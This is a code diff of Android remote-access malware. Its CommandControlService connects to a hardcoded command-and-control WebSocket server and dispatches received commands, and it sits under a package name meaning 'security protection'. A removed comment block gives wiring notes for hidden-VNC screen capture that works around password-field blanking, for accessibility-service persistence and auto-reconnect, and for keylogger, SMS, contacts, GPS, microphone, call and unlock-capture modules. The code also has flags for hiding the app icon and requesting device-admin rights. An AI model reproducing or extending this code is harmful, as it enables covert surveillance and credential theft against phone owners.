@@ -1,72 +1,6 @@
 package com.seguranca.protecao;
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// NEXUS v5 UPGRADE INTEGRATION NOTES (apply manually or via IDE refactor):
-//
-// 1. HVNC PASSWORD-FIELD FIX → SilentVncEngine
-//    Replace all AccessibilityService.takeScreenshot() capture code with:
-//      SilentVncEngine silentVnc = new SilentVncEngine(screenW, screenH, 360,
-//          (int)(360f * screenH / screenW), jpeg -> webSocket.send(ByteString.of(jpeg)));
-//      silentVnc.start(this);  // 'this' = AccessibilityService
-//    SilentVncEngine automatically falls back to NodeTreeRenderer when a
-//    password field blacks the screenshot. No MediaProjection needed.
-//
-// 2. ACCESSIBILITY WATCHDOG → AccessibilityWatchdog
-//    In onServiceConnected():
-//      AccessibilityWatchdog.getInstance(this)
-//          .start("com.seguranca.protecao/.UiAssistBridge");
-//    In onDestroy():
-//      AccessibilityWatchdog.getInstance(this).stop();
-//    Register AlarmReceiver in AndroidManifest.xml (see AccessibilityWatchdog source).
-//
-// 3. AUTO-RECONNECT → AutoReconnect
-//    Replace the existing reconnect logic with:
-//      AutoReconnect ar = new AutoReconnect(this, attempt -> createWebSocket());
-//      // On WS open:  ar.onConnected();
-//      // On WS close: ar.onDisconnected();
-//    Register AlarmReceiver in AndroidManifest.xml (see AutoReconnect source).
-//    Handle the RECONNECT_NOW intent in onStartCommand() → ar.forceRetry().
-//
-// 4. NEW FEATURE MODULES
-//    CallsManager, GpsManager, MicManager, KeyloggerManager (upgraded with
-//    KeyloggerAccessibility + KeystrokeDatabase), ContactsManager, SMSManager,
-//    UnlockManager/UnlockAccessibility are in features/ subdirectories.
-//    Wire them to their respective C2 commands in the switch block.
-//
-// 5. PROTOCOL CONSTANTS
-//    Use Protocol.java (core/) for all C2 event type strings.
-//
-// ─────────────────────────────────────────────────────────────────────────────
-// ADDITIONAL WIRING REQUIRED (v5 — fixes for SocketClient + MainService):
-//
-// 5. SOCKETCLIENT ATTACHMENT (CRITICAL for feature managers)
-//    In your WebSocketListener inner class:
-//
-//      @Override public void onOpen(WebSocket ws, Response r) {
-//          SocketClient.getInstance().attach(ws);
-//          // ... existing onOpen logic ...
-//      }
-//      @Override public void onClosing(WebSocket ws, int code, String reason) {
-//          SocketClient.getInstance().detach();
-//          // ... existing logic ...
-//      }
-//      @Override public void onFailure(WebSocket ws, Throwable t, Response r) {
-//          SocketClient.getInstance().detach();
-//          // ... existing logic ...
-//      }
-//
-// 6. MAINSERVICE LIFECYCLE
-//    In onCreate():
-//      com.seguranca.protecao.service.MainService.init(this);
-//    In onDestroy():
-//      com.seguranca.protecao.service.MainService.release();
-//
-// ─────────────────────────────────────────────────────────────────────────────
-// ═══════════════════════════════════════════════════════════════════════════════
-
-
 import android.app.Service;
-import com.seguranca.protecao.BuildConfig;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -124,7 +58,7 @@ public class CommandControlService extends Service {
     
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
-    public static final String SERVER_URL = BuildConfig.SERVER_URL;
+    public static final String SERVER_URL = "ws://192.168.1.14:5000/ws";
     public static final String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
@@ -527,7 +461,6 @@ public class CommandControlService extends Service {
             
             Request request = new Request.Builder()
                 .url(fullUrl)
-                .addHeader("x-device-id", deviceId)
                 .addHeader("bypass-tunnel-reminder", "true")
                 .addHeader("User-Agent", "Mozilla/5.0")
                 .build();
@@ -618,27 +551,18 @@ public class CommandControlService extends Service {
     /**
      * Callback: Comando recebido do servidor
      */
-        private void onCommandReceived(String commandJson) {
+    private void onCommandReceived(String commandJson) {
         Log.d(TAG, "Comando recebido: " + commandJson);
         
         try {
             JsonObject cmd = gson.fromJson(commandJson, JsonObject.class);
-            String action = cmd.has("cmd") ? cmd.get("cmd").getAsString()
-                          : (cmd.has("action") ? cmd.get("action").getAsString()
-                          : (cmd.has("type") && !"cmd".equals(cmd.get("type").getAsString()) ? cmd.get("type").getAsString() : null));
+            String action = cmd.has("action") ? cmd.get("action").getAsString() : (cmd.has("type") ? cmd.get("type").getAsString() : null);
             if (action == null || action.trim().isEmpty()) {
                 return;
             }
-            // Flatten nested args into root for handler compatibility
-            if (cmd.has("args") && cmd.get("args").isJsonObject()) {
-                JsonObject args = cmd.getAsJsonObject("args");
-                for (String key : args.keySet()) {
-                    cmd.add(key, args.get(key));
-                }
-            }
             action = action.trim();
             Log.d(TAG, "🎯 Processando ação: '" + action + "'");
-
+            
             switch (action) {
                 case "GET_DEVICE_INFO":
                 case "CHECK_PERMISSIONS":
